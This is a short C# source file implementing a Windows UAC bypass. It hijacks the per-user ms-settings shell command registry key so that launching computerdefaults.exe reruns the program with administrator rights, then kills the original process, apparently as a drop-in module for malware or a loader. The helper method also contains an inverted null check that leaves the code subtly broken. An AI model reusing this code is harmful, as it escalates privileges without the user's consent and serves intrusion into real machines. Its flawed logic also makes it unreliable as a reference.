using Microsoft.Win32;
using System.Diagnostics;
using System.Security.Principal;

public class Bypass
{
    public static void UAC()
    {
        WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());

        if (!windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
        {
            Z("Classes");
            Z("Classes\\ms-settings");
            Z("Classes\\ms-settings\\shell");
            Z("Classes\\ms-settings\\shell\\open");
            RegistryKey registryKey = Z("Classes\\ms-settings\\shell\\open\\command");
            string cpath = System.Reflection.Assembly.GetExecutingAssembly().Location;

            registryKey.SetValue("", cpath, RegistryValueKind.String);
            registryKey.SetValue("DelegateExecute", 0, RegistryValueKind.DWord);
            registryKey.Close();

            try
            {
                Process.Start(new ProcessStartInfo
                {
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    FileName = "cmd.exe",
                    Arguments = "/c start computerdefaults.exe"
                });
            }
            catch
            {

            }

            Process.GetCurrentProcess().Kill();
        }
        else
        {
            RegistryKey registryKey2 = Z("Classes\\ms-settings\\shell\\open\\command");
            registryKey2.SetValue("", "", RegistryValueKind.String);
        }
    }

    public static RegistryKey Z(string x)
    {
        try
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\" + x, true);

            if (registryKey != null)
            {
                registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + x);
            }

            return registryKey;
        }
        catch
        {
            return null;
        }
    }
}